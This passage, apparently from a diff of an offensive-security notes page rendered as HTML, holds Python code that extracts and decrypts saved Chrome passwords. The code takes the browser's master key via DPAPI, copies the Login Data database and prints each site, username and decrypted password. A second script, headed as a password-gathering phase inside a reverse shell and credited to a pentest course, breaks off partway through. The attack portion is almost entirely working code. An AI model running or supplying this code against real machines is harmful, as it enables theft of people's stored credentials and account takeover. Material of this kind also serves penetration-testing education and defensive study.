-</span><span id="__span-4-38"><a id="__codelineno-4-38" name="__codelineno-4-38" href="#__codelineno-4-38"></a><span class="n">master_key</span> <span class="o">=</span> <span class="n">get_master_key</span><span class="p">()</span>
-</span><span id="__span-4-39"><a id="__codelineno-4-39" name="__codelineno-4-39" href="#__codelineno-4-39"></a><span class="n">login_db</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">&#39;USERPROFILE&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">os</span><span class="o">.</span><span class="n">sep</span> <span class="o">+</span> <span class="sa">r</span><span class="s1">&#39;AppData\Local\Google\Chrome\User Data\default\Login Data&#39;</span>
-</span><span id="__span-4-40"><a id="__codelineno-4-40" name="__codelineno-4-40" href="#__codelineno-4-40"></a><span class="n">shutil</span><span class="o">.</span><span class="n">copy2</span><span class="p">(</span><span class="n">login_db</span><span class="p">,</span> <span class="s2">&quot;Loginvault.db&quot;</span><span class="p">)</span> <span class="c1">#making a temp copy since Login Data DB is locked while Chrome is running</span>
-</span><span id="__span-4-41"><a id="__codelineno-4-41" name="__codelineno-4-41" href="#__codelineno-4-41"></a><span class="n">conn</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s2">&quot;Loginvault.db&quot;</span><span class="p">)</span>
-</span><span id="__span-4-42"><a id="__codelineno-4-42" name="__codelineno-4-42" href="#__codelineno-4-42"></a><span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
-</span><span id="__span-4-43"><a id="__codelineno-4-43" name="__codelineno-4-43" href="#__codelineno-4-43"></a><span class="k">try</span><span class="p">:</span>
-</span><span id="__span-4-44"><a id="__codelineno-4-44" name="__codelineno-4-44" href="#__codelineno-4-44"></a>    <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&quot;SELECT action_url, username_value, password_value FROM logins&quot;</span><span class="p">)</span>
-</span><span id="__span-4-45"><a id="__codelineno-4-45" name="__codelineno-4-45" href="#__codelineno-4-45"></a>    <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchall</span><span class="p">():</span>
-</span><span id="__span-4-46"><a id="__codelineno-4-46" name="__codelineno-4-46" href="#__codelineno-4-46"></a>        <span class="n">url</span> <span class="o">=</span> <span class="n">r</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
-</span><span id="__span-4-47"><a id="__codelineno-4-47" name="__codelineno-4-47" href="#__codelineno-4-47"></a>        <span class="n">username</span> <span class="o">=</span> <span class="n">r</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-</span><span id="__span-4-48"><a id="__codelineno-4-48" name="__codelineno-4-48" href="#__codelineno-4-48"></a>        <span class="n">encrypted_password</span> <span class="o">=</span> <span class="n">r</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
-</span><span id="__span-4-49"><a id="__codelineno-4-49" name="__codelineno-4-49" href="#__codelineno-4-49"></a>        <span class="n">decrypted_password</span> <span class="o">=</span> <span class="n">decrypt_password</span><span class="p">(</span><span class="n">encrypted_password</span><span class="p">,</span> <span class="n">master_key</span><span class="p">)</span>
-</span><span id="__span-4-50"><a id="__codelineno-4-50" name="__codelineno-4-50" href="#__codelineno-4-50"></a>        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">username</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
-</span><span id="__span-4-51"><a id="__codelineno-4-51" name="__codelineno-4-51" href="#__codelineno-4-51"></a>            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;URL: &quot;</span> <span class="o">+</span> <span class="n">url</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">User Name: &quot;</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Password: &quot;</span> <span class="o">+</span> <span class="n">decrypted_password</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;*&quot;</span> <span class="o">*</span> <span class="mi">50</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
-</span><span id="__span-4-52"><a id="__codelineno-4-52" name="__codelineno-4-52" href="#__codelineno-4-52"></a><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-</span><span id="__span-4-53"><a id="__codelineno-4-53" name="__codelineno-4-53" href="#__codelineno-4-53"></a>    <span class="k">pass</span>
-</span><span id="__span-4-54"><a id="__codelineno-4-54" name="__codelineno-4-54" href="#__codelineno-4-54"></a><span class="n">cursor</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</span><span id="__span-4-55"><a id="__codelineno-4-55" name="__codelineno-4-55" href="#__codelineno-4-55"></a><span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</span><span id="__span-4-56"><a id="__codelineno-4-56" name="__codelineno-4-56" href="#__codelineno-4-56"></a><span class="k">try</span><span class="p">:</span>
-</span><span id="__span-4-57"><a id="__codelineno-4-57" name="__codelineno-4-57" href="#__codelineno-4-57"></a>    <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s2">&quot;Loginvault.db&quot;</span><span class="p">)</span>
-</span><span id="__span-4-58"><a id="__codelineno-4-58" name="__codelineno-4-58" href="#__codelineno-4-58"></a><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-</span><span id="__span-4-59"><a id="__codelineno-4-59" name="__codelineno-4-59" href="#__codelineno-4-59"></a>    <span class="k">pass</span>
-</span></code></pre></div>
+<div class="language-python highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-4-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-4-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-4-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-4-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-4-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-4-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-4-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-4-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-4-10">10</a></span>
+<span class="normal"><a href="#__codelineno-4-11">11</a></span>
+<span class="normal"><a href="#__codelineno-4-12">12</a></span>
+<span class="normal"><a href="#__codelineno-4-13">13</a></span>
+<span class="normal"><a href="#__codelineno-4-14">14</a></span>
+<span class="normal"><a href="#__codelineno-4-15">15</a></span>
+<span class="normal"><a href="#__codelineno-4-16">16</a></span>
+<span class="normal"><a href="#__codelineno-4-17">17</a></span>
+<span class="normal"><a href="#__codelineno-4-18">18</a></span>
+<span class="normal"><a href="#__codelineno-4-19">19</a></span>
+<span class="normal"><a href="#__codelineno-4-20">20</a></span>
+<span class="normal"><a href="#__codelineno-4-21">21</a></span>
+<span class="normal"><a href="#__codelineno-4-22">22</a></span>
+<span class="normal"><a href="#__codelineno-4-23">23</a></span>
+<span class="normal"><a href="#__codelineno-4-24">24</a></span>
+<span class="normal"><a href="#__codelineno-4-25">25</a></span>
+<span class="normal"><a href="#__codelineno-4-26">26</a></span>
+<span class="normal"><a href="#__codelineno-4-27">27</a></span>
+<span class="normal"><a href="#__codelineno-4-28">28</a></span>
+<span class="normal"><a href="#__codelineno-4-29">29</a></span>
+<span class="normal"><a href="#__codelineno-4-30">30</a></span>
+<span class="normal"><a href="#__codelineno-4-31">31</a></span>
+<span class="normal"><a href="#__codelineno-4-32">32</a></span>
+<span class="normal"><a href="#__codelineno-4-33">33</a></span>
+<span class="normal"><a href="#__codelineno-4-34">34</a></span>
+<span class="normal"><a href="#__codelineno-4-35">35</a></span>
+<span class="normal"><a href="#__codelineno-4-36">36</a></span>
+<span class="normal"><a href="#__codelineno-4-37">37</a></span>
+<span class="normal"><a href="#__codelineno-4-38">38</a></span>
+<span class="normal"><a href="#__codelineno-4-39">39</a></span>
+<span class="normal"><a href="#__codelineno-4-40">40</a></span>
+<span class="normal"><a href="#__codelineno-4-41">41</a></span>
+<span class="normal"><a href="#__codelineno-4-42">42</a></span>
+<span class="normal"><a href="#__codelineno-4-43">43</a></span>
+<span class="normal"><a href="#__codelineno-4-44">44</a></span>
+<span class="normal"><a href="#__codelineno-4-45">45</a></span>
+<span class="normal"><a href="#__codelineno-4-46">46</a></span>
+<span class="normal"><a href="#__codelineno-4-47">47</a></span>
+<span class="normal"><a href="#__codelineno-4-48">48</a></span>
+<span class="normal"><a href="#__codelineno-4-49">49</a></span>
+<span class="normal"><a href="#__codelineno-4-50">50</a></span>
+<span class="normal"><a href="#__codelineno-4-51">51</a></span>
+<span class="normal"><a href="#__codelineno-4-52">52</a></span>
+<span class="normal"><a href="#__codelineno-4-53">53</a></span>
+<span class="normal"><a href="#__codelineno-4-54">54</a></span>
+<span class="normal"><a href="#__codelineno-4-55">55</a></span>
+<span class="normal"><a href="#__codelineno-4-56">56</a></span>
+<span class="normal"><a href="#__codelineno-4-57">57</a></span>
+<span class="normal"><a href="#__codelineno-4-58">58</a></span>
+<span class="normal"><a href="#__codelineno-4-59">59</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="kn">import</span> <span class="nn">os</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="kn">import</span> <span class="nn">json</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a><span class="kn">import</span> <span class="nn">base64</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a><span class="kn">import</span> <span class="nn">sqlite3</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5"></a><span class="kn">import</span> <span class="nn">win32crypt</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6"></a><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7"></a><span class="kn">import</span> <span class="nn">shutil</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8"></a>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9"></a><span class="k">def</span> <span class="nf">get_master_key</span><span class="p">():</span>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10"></a>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">&#39;USERPROFILE&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">os</span><span class="o">.</span><span class="n">sep</span> <span class="o">+</span> <span class="sa">r</span><span class="s1">&#39;AppData\Local\Google\Chrome\User Data\Local State&#39;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11"></a>        <span class="n">local_state</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12"></a>        <span class="n">local_state</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">local_state</span><span class="p">)</span>
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13"></a>    <span class="n">master_key</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">local_state</span><span class="p">[</span><span class="s2">&quot;os_crypt&quot;</span><span class="p">][</span><span class="s2">&quot;encrypted_key&quot;</span><span class="p">])</span>
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14"></a>    <span class="n">master_key</span> <span class="o">=</span> <span class="n">master_key</span><span class="p">[</span><span class="mi">5</span><span class="p">:]</span>  <span class="c1"># removing DPAPI</span>
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15"></a>    <span class="n">master_key</span> <span class="o">=</span> <span class="n">win32crypt</span><span class="o">.</span><span class="n">CryptUnprotectData</span><span class="p">(</span><span class="n">master_key</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="mi">0</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16"></a>    <span class="k">return</span> <span class="n">master_key</span>
+</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17"></a>
+</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18"></a><span class="k">def</span> <span class="nf">decrypt_payload</span><span class="p">(</span><span class="n">cipher</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
+</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19"></a>    <span class="k">return</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20"></a>
+</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21"></a><span class="k">def</span> <span class="nf">generate_cipher</span><span class="p">(</span><span class="n">aes_key</span><span class="p">,</span> <span class="n">iv</span><span class="p">):</span>
+</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22"></a>    <span class="k">return</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">aes_key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_GCM</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23"></a>
+</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24"></a><span class="k">def</span> <span class="nf">decrypt_password</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="n">master_key</span><span class="p">):</span>
+</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25"></a>    <span class="k">try</span><span class="p">:</span>
+</span><span id="__span-4-26"><a id="__codelineno-4-26" name="__codelineno-4-26"></a>        <span class="n">iv</span> <span class="o">=</span> <span class="n">buff</span><span class="p">[</span><span class="mi">3</span><span class="p">:</span><span class="mi">15</span><span class="p">]</span>
+</span><span id="__span-4-27"><a id="__codelineno-4-27" name="__codelineno-4-27"></a>        <span class="n">payload</span> <span class="o">=</span> <span class="n">buff</span><span class="p">[</span><span class="mi">15</span><span class="p">:]</span>
+</span><span id="__span-4-28"><a id="__codelineno-4-28" name="__codelineno-4-28"></a>        <span class="n">cipher</span> <span class="o">=</span> <span class="n">generate_cipher</span><span class="p">(</span><span class="n">master_key</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+</span><span id="__span-4-29"><a id="__codelineno-4-29" name="__codelineno-4-29"></a>        <span class="n">decrypted_pass</span> <span class="o">=</span> <span class="n">decrypt_payload</span><span class="p">(</span><span class="n">cipher</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span><span id="__span-4-30"><a id="__codelineno-4-30" name="__codelineno-4-30"></a>        <span class="n">decrypted_pass</span> <span class="o">=</span> <span class="n">decrypted_pass</span><span class="p">[:</span><span class="o">-</span><span class="mi">16</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>  <span class="c1"># remove suffix bytes</span>
+</span><span id="__span-4-31"><a id="__codelineno-4-31" name="__codelineno-4-31"></a>        <span class="k">return</span> <span class="n">decrypted_pass</span>
+</span><span id="__span-4-32"><a id="__codelineno-4-32" name="__codelineno-4-32"></a>    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span><span id="__span-4-33"><a id="__codelineno-4-33" name="__codelineno-4-33"></a>        <span class="c1"># print(&quot;Probably saved password from Chrome version older than v80\n&quot;)</span>
+</span><span id="__span-4-34"><a id="__codelineno-4-34" name="__codelineno-4-34"></a>        <span class="c1"># print(str(e))</span>
+</span><span id="__span-4-35"><a id="__codelineno-4-35" name="__codelineno-4-35"></a>        <span class="k">return</span> <span class="s2">&quot;Chrome &lt; 80&quot;</span>
+</span><span id="__span-4-36"><a id="__codelineno-4-36" name="__codelineno-4-36"></a>
+</span><span id="__span-4-37"><a id="__codelineno-4-37" name="__codelineno-4-37"></a>
+</span><span id="__span-4-38"><a id="__codelineno-4-38" name="__codelineno-4-38"></a><span class="n">master_key</span> <span class="o">=</span> <span class="n">get_master_key</span><span class="p">()</span>
+</span><span id="__span-4-39"><a id="__codelineno-4-39" name="__codelineno-4-39"></a><span class="n">login_db</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">&#39;USERPROFILE&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">os</span><span class="o">.</span><span class="n">sep</span> <span class="o">+</span> <span class="sa">r</span><span class="s1">&#39;AppData\Local\Google\Chrome\User Data\default\Login Data&#39;</span>
+</span><span id="__span-4-40"><a id="__codelineno-4-40" name="__codelineno-4-40"></a><span class="n">shutil</span><span class="o">.</span><span class="n">copy2</span><span class="p">(</span><span class="n">login_db</span><span class="p">,</span> <span class="s2">&quot;Loginvault.db&quot;</span><span class="p">)</span> <span class="c1">#making a temp copy since Login Data DB is locked while Chrome is running</span>
+</span><span id="__span-4-41"><a id="__codelineno-4-41" name="__codelineno-4-41"></a><span class="n">conn</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s2">&quot;Loginvault.db&quot;</span><span class="p">)</span>
+</span><span id="__span-4-42"><a id="__codelineno-4-42" name="__codelineno-4-42"></a><span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+</span><span id="__span-4-43"><a id="__codelineno-4-43" name="__codelineno-4-43"></a><span class="k">try</span><span class="p">:</span>
+</span><span id="__span-4-44"><a id="__codelineno-4-44" name="__codelineno-4-44"></a>    <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&quot;SELECT action_url, username_value, password_value FROM logins&quot;</span><span class="p">)</span>
+</span><span id="__span-4-45"><a id="__codelineno-4-45" name="__codelineno-4-45"></a>    <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchall</span><span class="p">():</span>
+</span><span id="__span-4-46"><a id="__codelineno-4-46" name="__codelineno-4-46"></a>        <span class="n">url</span> <span class="o">=</span> <span class="n">r</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span><span id="__span-4-47"><a id="__codelineno-4-47" name="__codelineno-4-47"></a>        <span class="n">username</span> <span class="o">=</span> <span class="n">r</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span><span id="__span-4-48"><a id="__codelineno-4-48" name="__codelineno-4-48"></a>        <span class="n">encrypted_password</span> <span class="o">=</span> <span class="n">r</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+</span><span id="__span-4-49"><a id="__codelineno-4-49" name="__codelineno-4-49"></a>        <span class="n">decrypted_password</span> <span class="o">=</span> <span class="n">decrypt_password</span><span class="p">(</span><span class="n">encrypted_password</span><span class="p">,</span> <span class="n">master_key</span><span class="p">)</span>
+</span><span id="__span-4-50"><a id="__codelineno-4-50" name="__codelineno-4-50"></a>        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">username</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+</span><span id="__span-4-51"><a id="__codelineno-4-51" name="__codelineno-4-51"></a>            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;URL: &quot;</span> <span class="o">+</span> <span class="n">url</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">User Name: &quot;</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Password: &quot;</span> <span class="o">+</span> <span class="n">decrypted_password</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;*&quot;</span> <span class="o">*</span> <span class="mi">50</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-4-52"><a id="__codelineno-4-52" name="__codelineno-4-52"></a><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span><span id="__span-4-53"><a id="__codelineno-4-53" name="__codelineno-4-53"></a>    <span class="k">pass</span>
+</span><span id="__span-4-54"><a id="__codelineno-4-54" name="__codelineno-4-54"></a><span class="n">cursor</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span id="__span-4-55"><a id="__codelineno-4-55" name="__codelineno-4-55"></a><span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span id="__span-4-56"><a id="__codelineno-4-56" name="__codelineno-4-56"></a><span class="k">try</span><span class="p">:</span>
+</span><span id="__span-4-57"><a id="__codelineno-4-57" name="__codelineno-4-57"></a>    <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s2">&quot;Loginvault.db&quot;</span><span class="p">)</span>
+</span><span id="__span-4-58"><a id="__codelineno-4-58" name="__codelineno-4-58"></a><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span><span id="__span-4-59"><a id="__codelineno-4-59" name="__codelineno-4-59"></a>    <span class="k">pass</span>
+</span></code></pre></div></td></tr></table></div>
 <h3 id="script-with-gathering-passwords-phase-integrated-in-a-reverse-shell">Script with gathering passwords phase integrated in a reverse shell</h3>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Python For Offensive PenTest: A Complete Practical Course  - All rights reserved </span>
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="c1"># Follow me on LinkedIn  https://jo.linkedin.com/in/python2</span>
-</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
-</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="kn">import</span> <span class="nn">json</span>
-</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="kn">import</span> <span class="nn">base64</span>
-</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">getenv</span> 
-</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="c1"># To find out the Chrome SQL path- C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Login Data</span>
-</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>
-</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="kn">import</span> <span class="nn">sqlite3</span> <span class="c1"># To read the Chrome SQLite DB</span>
-</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
-</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="kn">import</span> <span class="nn">win32crypt</span>  <span class="c1"># High level library to call windows API CryptUnprotectData</span>
-</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>
-</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="kn">from</span> <span class="nn">shutil</span> <span class="kn">import</span> <span class="n">copyfile</span> <span class="c1"># To make a copy of the Chrome SQLite DB</span>
-</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>
-</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>
-</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="c1"># LOCALAPPDATA is a Windows Environment Variable which points to &gt;&gt;&gt; C:\Users\{username}\AppData\Local</span>
-</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a><span class="n">path</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s2">&quot;LOCALAPPDATA&quot;</span><span class="p">)</span><span class="o">+</span><span class="sa">r</span><span class="s2">&quot;\Google\Chrome\User Data\Default\Login Data&quot;</span>
-</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a>
-</span><span id="__span-5-19"><a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a><span class="c1"># make a copy the Login Data DB and pull data out of the copied DB</span>
-</span><span id="__span-5-20"><a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a><span class="n">path2</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s2">&quot;LOCALAPPDATA&quot;</span><span class="p">)</span><span class="o">+</span><span class="sa">r</span><span class="s2">&quot;\Google\Chrome\User Data\Default\Login2&quot;</span>
-</span><span id="__span-5-21"><a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a><span class="n">copyfile</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">path2</span><span class="p">)</span>
-</span><span id="__span-5-22"><a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a>
-</span><span id="__span-5-23"><a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a><span class="c1"># Connect to the copied Database</span>
-</span><span id="__span-5-24"><a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a><span class="n">conn</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">path2</span><span class="p">)</span>
-</span><span id="__span-5-25"><a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a>
-</span><span id="__span-5-26"><a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a>
-</span><span id="__span-5-27"><a id="__codelineno-5-27" name="__codelineno-5-27" href="#__codelineno-5-27"></a><span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span> <span class="c1">#Create a Cursor object and call its execute() method to perform SQL commands like SELECT</span>
-</span><span id="__span-5-28"><a id="__codelineno-5-28" name="__codelineno-5-28" href="#__codelineno-5-28"></a>
-</span><span id="__span-5-29"><a id="__codelineno-5-29" name="__codelineno-5-29" href="#__codelineno-5-29"></a><span class="c1"># SELECT column_name,column_name FROM table_name</span>
-</span><span id="__span-5-30"><a id="__codelineno-5-30" name="__codelineno-5-30" href="#__codelineno-5-30"></a><span class="c1"># SELECT action_url and username_value and password_value FROM table logins</span>
-</span><span id="__span-5-31"><a id="__codelineno-5-31" name="__codelineno-5-31" href="#__codelineno-5-31"></a><span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;SELECT action_url, username_value, password_value FROM logins&#39;</span><span class="p">)</span>
-</span><span id="__span-5-32"><a id="__codelineno-5-32" name="__codelineno-5-32" href="#__codelineno-5-32"></a>
-</span><span id="__span-5-33"><a id="__codelineno-5-33" name="__codelineno-5-33" href="#__codelineno-5-33"></a>
-</span><span id="__span-5-34"><a id="__codelineno-5-34" name="__codelineno-5-34" href="#__codelineno-5-34"></a><span class="c1"># To retrieve data after executing a SELECT statement, we call fetchall() to get a list of the matching rows.</span>
-</span><span id="__span-5-35"><a id="__codelineno-5-35" name="__codelineno-5-35" href="#__codelineno-5-35"></a><span class="k">for</span> <span class="n">raw</span> <span class="ow">in</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchall</span><span class="p">():</span>
-</span><span id="__span-5-36"><a id="__codelineno-5-36" name="__codelineno-5-36" href="#__codelineno-5-36"></a>
